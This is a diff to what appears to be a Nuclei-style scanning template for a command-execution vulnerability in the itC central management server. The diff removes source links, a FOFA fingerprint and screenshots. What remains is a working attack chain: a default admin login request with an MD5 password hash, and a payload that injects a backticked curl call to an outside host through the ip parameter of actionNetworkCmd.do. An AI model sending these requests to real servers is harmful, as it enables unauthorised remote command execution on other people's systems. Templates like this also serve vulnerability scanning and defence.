@@ -3,12 +3,8 @@ info:
   name: itC 中心管理服务器 actionNetworkCmd.do 存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ypvu8g9s0ld7b9pg'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ypvu8g9s0ld7b9pg
-    fofa: body="/mt_res_v3/img/public/logo.ico"
 http:
 - raw:
   - 'POST /frame/actionLogin.do HTTP/1.1
@@ -35,18 +31,10 @@ http:
     account=admin&password=21232f297a57a5a743894a0e4a801fc3&language=zh_CN
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711644730-48be7898-8913-4279-a7be-dd862728da86.png)
-
     请求体返回为0为正确密码，可登录后台
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711644996-15fa0b37-76a7-425f-aaa0-03dc24bdd2a5.png)
-
-
-    后台RCE
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711645245-ddca14ac-53c6-401e-a38c-f4f97bff245b.png)'
+    后台RCE'
   redirects: false
   matchers:
   - status:
@@ -74,11 +62,7 @@ http:
     Accept: */*
 
 
-    type=0&ip=127.0.0.1`curl pfmyxocpcj.iyhc.eu.org`&time=5&port=
-
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711645537-9446b6b2-492e-4b4c-a13d-f39bfb9b7035.png)'
+    type=0&ip=127.0.0.1`curl pfmyxocpcj.iyhc.eu.org`&time=5&port='
   redirects: false
   matchers:
   - status:
